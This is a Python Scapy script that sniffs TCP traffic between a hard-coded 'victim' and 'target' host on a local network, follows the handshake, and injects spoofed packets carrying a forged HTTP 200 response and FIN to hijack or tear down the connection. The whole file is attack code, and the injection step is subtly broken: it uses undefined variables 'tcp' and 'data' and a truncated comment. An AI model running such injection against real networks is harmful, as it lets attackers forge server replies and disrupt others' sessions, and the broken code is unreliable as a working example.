#!/usr/bin/env python3

from scapy.all import *

# Define the initial state
state = "WAITING"
src_port = 0
dst_port = 0
src_addr = ""
dst_addr = ""
seq_num = 0

# Define the reply function
def reply(packet):
    global state
    global src_port
    global dst_port
    global src_addr
    global dst_addr
    global seq_num

    # Check if the packet is a TCP SYN packet
    if packet.haslayer(TCP) and packet[TCP].flags == "S":
        # Check if we are in the WAITING state
        if state == "WAITING":
            # Record the source and destination ports and addresses
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            src_addr = packet[IP].src
            dst_addr = packet[IP].dst
            # Move to the SYN_RCVD state
            state = "SYN_RCVD"

    # Check if the packet is a server->client SYN-ACK packet matching our flow
    elif packet.haslayer(TCP) and packet[TCP].flags == "SA" and packet[TCP].sport == dst_port and packet[TCP].dport == src_port and packet[IP].src == dst_addr and packet[IP].dst == src_addr:
        # Check if we are in the SYN_RCVD state
        if state == "SYN_RCVD":
            # Move to the SYN_ACK_RCVD state
            state = "SYN_ACK_RCVD"

    # Check if the packet is a client->server ACK packet matching our flow
    elif packet.haslayer(TCP) and packet[TCP].flags == "A" and packet[TCP].sport == src_port and packet[TCP].dport == dst_port and packet[IP].src == src_addr and packet[IP].dst == dst_addr:
        # Check if we are in the SYN_ACK_RCVD state
        if state == "SYN_ACK_RCVD":
            # Record the sequence number of the packet
            seq_num = packet[TCP].seq
            # Move to the ACK_SENT state
            state = "ACK_SENT"

    # Check if the packet is a client->server data packet matching our flow
    elif packet.haslayer(TCP) and packet[TCP].flags == "PA" and packet[TCP].sport == src_port and packet[TCP].dport == dst_port and packet[IP].src == src_addr and packet[IP].dst == dst_addr:
        # Check if we are in the ACK_SENT state
        if state == "ACK_SENT":
            # Move to the QUERY_SENT state
            state = "QUERY_SENT"

    # Check if the packet is a server->client ACK packet matching our flow and acknowledging the previously-seen packet
    elif packet.haslayer(TCP) and packet[TCP].flags == "A" and packet[TCP].sport == dst_port and packet[TCP].dport == src_port and packet[IP].src == dst_addr and packet[IP].dst == src_addr and packet[TCP].ack == seq_num + 1:
        # Check if we are in the QUERY_SENT state
        if state == "QUERY_SENT":
            # Build and send spoofed HTTP response
            #spoofed_pkt = IP(src=dst_addr, dst=src_addr)/TCP(sport=dst_port, dport=src_port, flags="PA", ack=packet[TCP].seq, seq=packet[TCP].ack)/Raw(load="HTTP/1.1 200 OK\r\n\r\n")
            # Build and send spoofed HTTP response
            # Build and send spoofed FIN
            fin = IP(src=target_ip, dst=victim_ip)/TCP(sport=tcp.dport, dport=tcp.sport, flags='F', ack=tcp.seq+len(data), seq=packet[TCP].ack)/Raw(load="HTTP/1.1 200 OK\r\n\r\n")
            send(fin, verbose=0)
            send(fin, verbose=0)  # Recommended to send twi
            # Erase recorded variables
            previous_seq_num = 0
            state = "WAITING"

victim_ip = '10.0.0.27'
target_ip = '10.0.0.28'
sniff(iface='enp0s3', prn=reply, filter='tcp and host ' + victim_ip + ' and host ' + target_ip)
#sniff(iface='wlx00c0cab1b7e3', prn=reply, filter='tcp and host ' + victim_ip + ' and host ' + target_ip)